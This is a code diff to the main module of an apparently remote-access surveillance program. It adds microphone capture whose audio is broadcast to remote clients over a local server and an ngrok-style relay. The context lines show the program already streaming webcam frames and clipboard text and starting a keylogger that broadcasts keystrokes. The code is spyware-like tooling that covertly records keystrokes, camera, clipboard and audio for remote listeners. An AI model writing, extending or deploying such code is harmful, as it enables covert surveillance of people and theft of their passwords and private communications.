@@ -7,6 +7,7 @@ import controller
 import recorder as rec
 import camera as cam
 import clipboard_monitor as cb
+import microphone as mic_mod
 
 PORT = int(os.environ.get("NORA_PORT", 9090))
 NGROK_TOKEN = os.environ.get("NGROK_TOKEN", "")
@@ -67,10 +68,15 @@ def main():
         server.broadcast_clipboard(text)
         if relay: relay.broadcast_clipboard(text)
 
+    def broadcast_audio(b64):
+        server.broadcast_audio(b64)
+        if relay: relay.broadcast_audio(b64)
+
+    mic = mic_mod.MicCapture(on_chunk=broadcast_audio)
     camera = cam.CameraCapture(on_frame=broadcast_camera, fps=8, quality=40)
-    server.init(controller.handle_command, recorder, camera)
+    server.init(controller.handle_command, recorder, camera, mic)
     if relay:
-        relay.init(controller.handle_command, recorder, camera)
+        relay.init(controller.handle_command, recorder, camera, mic)
         relay.run()
 
     kl.Keylogger(broadcast_key).start()
